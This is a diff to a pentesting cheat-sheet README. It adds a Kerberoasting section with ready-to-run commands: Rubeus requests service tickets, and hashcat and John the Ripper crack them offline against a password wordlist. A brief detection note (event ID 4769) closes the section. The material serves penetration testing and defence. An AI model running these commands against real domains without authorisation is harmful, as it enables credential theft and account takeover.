@@ -20,8 +20,21 @@ Cybersecurity Red team and Blue team tooling for ease of use during penetration 
 ---
 
 ## Kerberoasting
+To obtain crackable tickets, we can use [Rubeus](https://github.com/GhostPack/Rubeus) 
 
-*Coming soon...*
+`PS C:\Users\bob\Downloads> .\Rubeus.exe kerberoast /outfile:spn.txt`
+
+We can use hashcat with the hash-mode (option -m) 13100 for a Kerberoastable TGS. 
+We also pass a [dictionary file](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials) with passwords (the file passwords.txt) and save the output of any successfully cracked tickets to a file called cracked.txt:
+
+`hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"`
+
+Alternatively, the captured TGS hashes can be cracked with John The Ripper:
+
+`sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot`
+
+*Detection*
+When a TGS is requested, an event log with ID 4769 is generated.
 
 ## AS-REProasting
 
